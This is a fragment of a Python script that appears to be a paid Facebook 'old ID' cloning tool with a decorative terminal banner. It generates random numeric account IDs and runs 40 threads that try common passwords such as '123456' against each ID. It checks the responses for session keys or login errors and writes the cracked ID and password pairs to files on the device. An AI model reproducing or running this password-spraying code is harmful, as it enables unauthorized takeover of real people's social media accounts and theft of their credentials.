...
#----------------------------[LOGO]-----------------------------------#
logo = (f"""
  \033[38;5;96m███╗░░░███╗██╗███████╗░█████╗░███╗░░██╗  \033[38;5;96m
  \033[38;5;96m████╗░████║██║╚════██║██╔══██╗████╗░██║  \033[38;5;96m
  \033[38;5;96m██║╚██╔╝██║██║██╔══╝░░██╔══██║██║╚████║  \033[38;5;96m
  \033[38;5;96m██║░╚═╝░██║██║███████╗██║░░██║██║░╚███║  \033[38;5;96m
   \033[38;5;96m     ╚═╝░░░░░╚═╝╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚══╝  \033[38;5;96m
\033[37;1m-------------------------------------               
  \033[38;5;96m\033[47m E \x1b[0m\033[37;1m WORKING      FILE CLONE-❌
  \033[38;5;96m\033[47m M \x1b[0m\033[37;1m WORKING      RANDOM-OLD-ID
  \033[38;5;97m\033[47m R \x1b[0m\033[37;1m GITHUB       MIZAN
  \033[38;5;98m\033[47m A \x1b[0m\033[37;1m COMMAND      \033[38;5;96m\033[47mPAID\x1b[0m
  \033[38;5;96m\033[47m N \x1b[0m\033[37;1m VERSION      \033[38;5;96m\033[47m005EHC\x1b[0m
\033[1;97m-------------------------------------""")
#----------------------------[MAIN/DEF]-----------------------------------#
def main():
    user=[]
    ...
    os.system('clear')
    print(logo)
    print("\x1b[38;5;8m(\x1b[1;97m1\x1b[38;5;8m) \x1b[1;97mMETHOD ~ (2004-2005-2010-2009)")
    lin()
    ...
    if ask in["1"]:
        ...
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,1999999999)))
            user.append(data)    
    with ThreadPool(max_workers=40) as EhcEmran:
        os.system('clear')
        print(logo)
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","123123","143143"]:
            ...
            if "session_key" in rp:
                print(f"\r\r{G}SUCCESS {A}➤{coki} {G}{uid} {A}•{G} {pw}")
                open("/sdcard/EhcEmran-OLD-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r{G}MIZA -OK🌸 {A}➤{coki} {G}{uid} {A}•{G} {pw}")              
                open("/sdcard/EhcEmran-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r{G} MIZANUR-OK🌸 {A}➤{coki} {G}{uid} {A}•{G} {pw}")
                open("/sdcard/EhcEmran-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
